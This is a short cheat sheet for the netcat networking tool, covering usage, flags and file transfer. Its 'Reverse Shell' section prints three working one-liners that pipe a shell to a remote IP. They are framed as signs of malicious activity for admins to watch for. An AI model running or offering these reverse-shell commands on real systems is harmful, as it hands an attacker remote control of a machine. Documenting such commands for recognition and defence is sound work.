---
title: 'CheatSheet: netcat'
description: 'Arbitrary TCP and UDP connections and listens.'
meta: "Common uses and flags for netcat"
published: true
---
- ## CheatSheet: netcat
	---
	Netcat is a networking tool that can provide simple network connections to read or write data between remote endpoints. This tool is useful for troubleshooting networks, exploring remote resources, and creating ad-hoc communication channels.

	Unexpected use of this utility may be an indicator of malicious activity.

- ## Basic Usage
	---
	```
	// Arbitrary TCP and UDP connections and listens.
	nc [options] <hostname> <dest_port(s)> 
	```

- ## Common Flags
	---
	[-4] Forces nc to use IPv4 addresses.
	
	[-6] Forces nc to use IPv6 addresses.
	
	[-i] Interval, specifies a delay time interval betweens lines of text sent/recieved.
	
	[-k] Forces nc to stay listening for another connection after its current connection is completed.
	
	[-l] Listen for connections.
	
	[-n] Do not make and DNS/service lookups on specified addresses, hostnames, or ports.
	
	[-p] Source Port
	
	[-r] Select source/destination ports randomly instead of sequentially.
	
	[-s] Source IP Address
	
	[-u] Use UDP instead of TCP.
	
	[-w] Timeout, silently close connection if connection/stdin are idle for more than timeout seconds.

- ## File Transfers
	---
	```
	// On the file recipient.
	nc -l -p 40000 > out.file
	
	// On the file sender.
	nc -w 3 10.10.10.10 40000 < in.file
	```

- ## Reverse Shell
	---
	This activity is highly unsual for a network admin to perform. If the following commands are observed, they should be viewed with extreme caution. I recommend establishing connections with more traditional methods for day-to-day admin activity.
	```
	// Standard
	nc -e /bin/sh 10.0.0.1 40001
	
	// -e is not available, OpenBSD
	nc 10.0.0.2 40002 | /bin/bash | nc 10.0.0.2 40002
	
	// -e is not available
	rm /tmp/f; mkfifo /tmp/f; cat tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.3 40003 > /tmp/f
	```
